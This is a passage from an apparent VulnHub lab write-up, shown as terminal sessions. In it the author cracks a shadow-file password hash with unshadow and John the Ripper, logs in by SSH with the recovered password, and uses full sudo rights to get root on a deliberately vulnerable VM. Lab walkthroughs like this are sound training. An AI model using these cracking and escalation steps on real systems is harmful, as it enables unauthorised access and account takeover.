joshua@kaligra:~/Documents/vulnhub/basic_pentesting_1$ unshadow
Usage: unshadow PASSWORD-FILE SHADOW-FILE
joshua@kaligra:~/Documents/vulnhub/basic_pentesting_1$ unshadow passwd shadow > tocrack
joshua@kaligra:~/Documents/vulnhub/basic_pentesting_1$ john tocrack
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 2 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Warning: Only 5 candidates buffered for the current salt, minimum 8 needed for performance.
marlinspike      (marlinspike)
1g 0:00:00:00 DONE 1/3 (2022-08-06 12:12) 12.50g/s 62.50p/s 62.50c/s 62.50C/s marlinspike..marli
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

## Privesc

```
joshua@kaligra:~/Documents/vulnhub/basic_pentesting_1$ ssh marlinspike@10.0.2.20
marlinspike@10.0.2.20's password:
Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.10.0-28-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

651 packages can be updated.
504 updates are security updates.

New release '18.04.6 LTS' available.
Run 'do-release-upgrade' to upgrade to it.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

marlinspike@vtcsec:~$ sudo -l
[sudo] password for marlinspike:
Matching Defaults entries for marlinspike on vtcsec:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User marlinspike may run the following commands on vtcsec:
    (ALL : ALL) ALL
marlinspike@vtcsec:~$ sudo -i
root@vtcsec:~# id
uid=0(root) gid=0(root) groups=0(root)
root@vtcsec:~#
```
				



